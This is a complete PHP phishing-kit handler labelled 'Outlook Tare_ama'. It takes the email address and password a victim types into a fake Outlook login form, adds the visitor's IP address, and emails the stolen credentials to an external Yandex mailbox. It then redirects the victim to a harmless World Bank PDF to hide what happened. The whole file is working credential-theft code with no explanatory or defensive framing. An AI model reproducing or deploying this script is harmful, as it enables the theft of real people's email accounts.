<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Outlook Tare_ama || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="willianahppy@yandex.com";
$subject = "tare_ama | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://openknowledge.worldbank.org/bitstream/handle/10986/25697/9781464809941.pdf");
?>